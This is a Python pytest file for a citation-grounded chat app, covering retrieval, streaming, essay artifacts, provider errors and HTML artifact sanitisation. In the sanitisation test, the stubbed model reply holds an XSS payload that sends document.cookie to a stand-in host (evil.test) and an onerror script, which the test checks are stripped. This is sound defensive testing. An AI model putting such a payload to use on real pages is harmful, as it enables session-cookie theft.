import json

from tests.conftest import StubProvider


async def test_chat_persists_both_messages_with_citations(seeded_client, session_id):
    resp = await seeded_client.post("/api/chat", json={
        "session_id": session_id,
        "message": "What does the guest say predicts week four retention?"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["content"]
    assert body["grounded"] is True
    assert body["citations"]
    assert body["citations"][0]["title"]
    assert body["route"]["skill"] == "grounded_answer"

    stored = (await seeded_client.get(f"/api/sessions/{session_id}/messages")).json()
    assert [m["role"] for m in stored] == ["user", "assistant"]
    assert stored[1]["citations"]
    assert stored[1]["latency_ms"] is not None


async def test_context_block_reaches_the_model(seeded_client, session_id):
    await seeded_client.post("/api/chat", json={
        "session_id": session_id, "message": "How should we pick a value metric?"})
    last = StubProvider.calls[-1]
    assert "[S1]" in last["messages"][-1]
    assert "value metric" in last["messages"][-1].lower()


async def test_follow_up_carries_prior_turn_into_retrieval(seeded_client, session_id):
    await seeded_client.post("/api/chat", json={
        "session_id": session_id, "message": "How do growth loops compound?"})
    resp = await seeded_client.post("/api/chat", json={
        "session_id": session_id, "message": "and cycle time?"})
    assert resp.json()["citations"], "short follow-up should still retrieve"


async def test_ungrounded_question_is_flagged_not_answered_freely(seeded_client, session_id):
    resp = await seeded_client.post("/api/chat", json={
        "session_id": session_id,
        "message": "What is the atomic mass of praseodymium in daltons?"})
    body = resp.json()
    assert body["grounded"] is False
    last = StubProvider.calls[-1]
    assert "do not cover" in last["system"].lower() or "nothing relevant" in last["system"].lower()


async def test_artifact_is_created_sanitised_and_retrievable(seeded_client, session_id):
    StubProvider.reply = (
        "<html><body><h1>Pricing one-pager</h1>"
        "<script>fetch('https://evil.test/'+document.cookie)</script>"
        "<img src=x onerror='alert(1)'></body></html>")
    resp = await seeded_client.post("/api/chat", json={
        "session_id": session_id,
        "message": "Build an HTML one-pager about pricing",
    })
    artifact = resp.json()["artifact"]
    assert artifact["kind"] == "html"
    assert artifact["title"] == "Pricing one-pager"
    assert "onerror" not in artifact["content"]
    assert "document.cookie" not in artifact["content"]
    assert "Content-Security-Policy" in artifact["content"]

    fetched = (await seeded_client.get(f"/api/artifacts/{artifact['id']}")).json()
    assert fetched["content"] == artifact["content"]

    raw = (await seeded_client.get(f"/api/artifacts/{artifact['id']}/raw")).json()
    assert "document.cookie" in raw["source"], "raw model output is kept for auditing"

    download = await seeded_client.get(f"/api/artifacts/{artifact['id']}/download")
    assert download.status_code == 200
    assert "attachment" in download.headers["content-disposition"]


async def test_artifact_policy_is_documented(app_client):
    policy = (await app_client.get("/api/artifacts/meta/policy")).json()
    assert "allow-same-origin" not in policy["sandbox"]
    assert policy["same_origin"] is False
    assert any("iframe" in b for b in policy["blocked"])


async def test_stream_emits_ordered_events(seeded_client, session_id):
    events = []
    async with seeded_client.stream("POST", "/api/chat/stream", json={
            "session_id": session_id, "message": "What is activation?"}) as resp:
        assert resp.status_code == 200
        current = None
        async for line in resp.aiter_lines():
            if line.startswith("event: "):
                current = line[7:].strip()
            elif line.startswith("data: ") and current:
                events.append((current, json.loads(line[6:])))

    kinds = [k for k, _ in events]
    assert kinds[0] == "status"
    assert "route" in kinds
    assert "citations" in kinds
    assert "token" in kinds
    assert kinds[-2:] == ["done", "close"] or kinds[-1] == "close"
    text = "".join(d["text"] for k, d in events if k == "token")
    assert text.strip()


async def test_ship30_essay_is_validated_and_stored_as_artifact(seeded_client, session_id):
    StubProvider.reply = _essay()
    resp = await seeded_client.post("/api/chat", json={
        "session_id": session_id, "message": "Write a Ship 30 essay about growth loops"})
    body = resp.json()
    assert body["route"]["skill"] == "ship30_essay"
    assert body["artifact"]["kind"] == "markdown"
    assert body["artifact"]["title"] == "Cycle time is the growth metric nobody games"


async def test_provider_failure_returns_actionable_error(seeded_client, session_id,
                                                          monkeypatch):
    from app.llm import registry
    from app.llm.base import ProviderUnavailable

    async def boom(*args, **kwargs):
        raise ProviderUnavailable("Ollama is not reachable at http://localhost:11434.",
                                  provider="ollama", kind="unavailable")
        yield  # pragma: no cover

    monkeypatch.setattr(registry, "stream_with_fallback", boom)
    monkeypatch.setattr("app.agent.orchestrator.stream_with_fallback", boom)

    body = (await seeded_client.post("/api/chat", json={
        "session_id": session_id, "message": "What is activation?"})).json()
    assert body["error"]["kind"] == "unavailable"
    assert "ollama serve" in body["error"]["remediation"].lower()


def _essay() -> str:
    body = " ".join(["Growth loops compound while funnels do not."] * 57)
    return f"""# Cycle time is the growth metric nobody games

Most growth teams track the wrong half of their loop.

## Loops beat funnels
{body}

**Cycle time halves before coefficients double.**

- Input
- Action
- Output

## Coefficient is not enough
{body}

**A slow loop is a leak with an arrow drawn around it.**

- Measure days, not rates
- Instrument the handoff

## Loops decay on someone else's schedule
{body}

**Assume a two-year half-life on any third-party channel.**

## The one thing to do this week
Measure the cycle time of your largest loop and write the number on the wall.

## Sources
- [S1] Why growth loops beat funnels — Priya Raman
"""
